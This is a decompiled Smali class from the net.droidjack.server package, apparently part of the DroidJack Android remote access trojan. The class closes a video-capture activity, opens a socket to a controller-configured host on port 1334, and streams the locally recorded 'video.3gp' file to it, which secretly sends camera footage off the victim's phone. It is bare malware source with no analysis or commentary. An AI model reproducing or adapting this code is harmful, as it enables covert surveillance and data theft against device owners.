.class Lnet/droidjack/server/cc;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lnet/droidjack/server/VideoCapDJ;


# direct methods
.method constructor <init>(Lnet/droidjack/server/VideoCapDJ;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-virtual {v0}, Lnet/droidjack/server/VideoCapDJ;->finish()V

    iget-object v0, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-static {v0}, Lnet/droidjack/server/VideoCapDJ;->a(Lnet/droidjack/server/VideoCapDJ;)V

    iget-object v0, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    new-instance v1, Ljava/net/Socket;

    sget-object v2, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const/16 v3, 0x536

    invoke-direct {v1, v2, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    invoke-static {v0, v1}, Lnet/droidjack/server/VideoCapDJ;->a(Lnet/droidjack/server/VideoCapDJ;Ljava/net/Socket;)V

    iget-object v0, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-static {v0}, Lnet/droidjack/server/VideoCapDJ;->b(Lnet/droidjack/server/VideoCapDJ;)Ljava/net/Socket;

    move-result-object v0

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    new-instance v1, Ljava/io/FileInputStream;

    iget-object v2, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    const-string v3, "video.3gp"

    invoke-virtual {v2, v3}, Lnet/droidjack/server/VideoCapDJ;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    const/16 v2, 0x400

    new-array v2, v2, [B

    :goto_0
    invoke-virtual {v1, v2}, Ljava/io/FileInputStream;->read([B)I

    move-result v3

    const/4 v4, -0x1

    if-ne v3, v4, :cond_0

    invoke-virtual {v1}, Ljava/io/FileInputStream;->close()V

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V

    iget-object v0, p0, Lnet/droidjack/server/cc;->a:Lnet/droidjack/server/VideoCapDJ;

    invoke-static {v0}, Lnet/droidjack/server/VideoCapDJ;->b(Lnet/droidjack/server/VideoCapDJ;)Ljava/net/Socket;

    move-result-object v0

    invoke-virtual {v0}, Ljava/net/Socket;->close()V

    :goto_1
    return-void

    :cond_0
    sget-object v4, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v4, v3}, Ljava/io/PrintStream;->println(I)V

    const/4 v4, 0x0

    invoke-virtual {v0, v2, v4, v3}, Ljava/io/OutputStream;->write([BII)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
